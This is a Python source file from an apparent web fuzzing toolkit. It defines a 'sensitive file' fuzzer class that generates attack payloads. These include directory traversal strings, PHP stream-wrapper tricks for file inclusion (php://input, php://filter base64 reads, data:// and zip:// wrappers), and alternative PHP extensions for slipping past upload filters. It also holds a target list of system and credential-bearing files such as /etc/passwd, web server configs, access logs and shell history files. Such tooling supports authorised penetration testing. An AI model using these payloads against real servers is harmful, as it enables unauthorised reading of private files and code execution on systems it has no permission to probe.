#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class SFile(Fuzzer):

    """sensitive File"""

    def __init__(self):
        super(SFile, self).__init__()
        # windows max dir length
        self.winmax = 259
        # linux max dir length
        self.linuxmax = 4096

    @staticmethod
    def traverse(cnt=5, path="../"):
        return path * cnt

    @staticmethod
    def fakeProtocol(type, msg=""):
        if type == "php":
            return "php://input"
        elif type == "phpb64":
            return "php://filter/convert.base64-encode/resource=" + msg
        elif type == "textb64":
            return "data://text/plain;base64," + msg.encode("base64")
        elif type == "text":
            return "data://text/plain;" + msg
        elif type == "zip":
            return ["zip://", "bzip2://", "zlib://"][0] + msg

    @staticmethod
    def sourceCode(ext):
        l = ["app", "index", "main"]
        return list(map(lambda i: i+"."+ext, l))

    @staticmethod
    def list():
        return [
            "/etc/passwd",
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/proc/cpuinfo",
            ".gitconfig",
            ".bashrc",
            ".bash_history",
            ".zsh_history",
            ".profile",
        ]

    @staticmethod
    def phpByPassext():
        return ["pht", "php3", "php5", "phtml"]
